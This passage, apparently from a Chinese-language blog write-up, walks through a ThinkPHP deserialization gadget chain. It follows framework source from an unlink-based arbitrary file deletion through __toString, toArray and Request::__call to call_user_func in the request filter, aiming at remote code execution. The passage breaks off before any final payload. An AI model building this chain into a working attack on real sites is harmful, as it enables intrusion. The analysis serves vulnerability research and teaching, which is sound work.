class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除临时文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            @unlink(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第20行处 private $files = [];</p><p>所以这里的$this-&gt;files可控，结合@unlink()，故存在任意文件删除。</p><p>注意到file_exists()，如果传入的参数是一个对象，这里它被当成字符串处理，则会触发<code>__toString()</code>，而传入的参数正是我们可控的</p><p>接下来尝试去寻找有无可利用的<code>__toString()</code></p><p>在think\model\concern的trait Conversion中存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进toJson()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换当前模型对象为JSON字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options json参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进toArray()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span>       = [];</span><br><span class="line">    <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并关联数据</span></span><br><span class="line">    <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// 关联模型对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$val</span>-&gt;visible(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$val</span>-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 关联模型对象</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;toArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray() : [];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span>-&gt;visible([<span class="variable">$attr</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray() : [];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点看到这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>最后一个if语句中，执行方法<code>$relation-&gt;visible($name);</code></p><p>如果是可控变量-&gt;方法(可控参数)，就可以去找__call</p><p>看下是否是可控的，$this-&gt;append可控，再看getRelation()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$name</code>可控，易使得getRelation()返回为空，进而if (!$relation)成立，进入getAttr()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进getData()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getData()返回的<code>$this-&gt;data</code>可控，所以相当于 <code>$relation = $this-&gt;data($key);</code>，故$relation可控</p><p><code>$name</code>为<code>$this-&gt;append</code>的键值，<code>$append</code>可控，故<code>$name</code>也可控</p><p>但需要注意，<code>__toString()</code>是<code>Conversion</code>类的，<code>getAttr()</code>等是<code>Attribute</code>类的，这两个都是trait类。</p><blockquote><p>自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。</p></blockquote><p>经过寻找，找到了Model类符合要求</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210905174435123.png" alt="image-20210905174435123"></p><p>但它是一个抽象类，抽象类不能直接实例化</p><blockquote><p>抽象类不能被直接实例化。抽象类中只定义（或部分实现）子类需要的方法。子类可以通过继承抽象类并通过实现抽象类中的所有抽象方法，使抽象类具体化。<br>如果子类需要实例化，前提是它实现了抽象类中的所有抽象方法。如果子类没有全部实现抽象类中的所有抽象方法，那么该子类也是一个抽象类，必须在 class 前面加上 abstract 关键字，并且不能被实例化。</p></blockquote><p>构造的时候需要实例化Model类的一个非抽象子类，找到了Pivot类</p><p>现在缺一个进行代码执行的点，想办法找找有没有可利用的<code>__call()</code>，我们可以构造不存在的方法来调用它，一番搜寻找到Request类的__call()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift(<span class="variable">$args</span>, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::class . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$hook</code>可控，可以构造一个hook数组<code>&quot;visable&quot;=&gt;&quot;method&quot;</code>，但不能直接利用call_user_func_array()执行命令，array_unshift()把<code>$this</code>插到了<code>$args</code>的前面，使得参数不可控</p><blockquote><p>在Thinkphp的Request类中还有一个功能<code>filter</code>功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖<code>filter</code>的方法去执行代码。</p></blockquote><p>在Request.php的1459行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$default</span> = array_pop(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            <span class="variable">$value</span> = call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>想办法让call_user_func()的两个参数可控</p><p>在Request类的input方法中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;arrayReset(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用<code>array_walk_recursive()</code>来调用<code>filterValue</code>方法，注意<code>$filter</code>是通过<code>getFilter</code>得到的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以<code>$filter = $this-&gt;getFilter($filter, 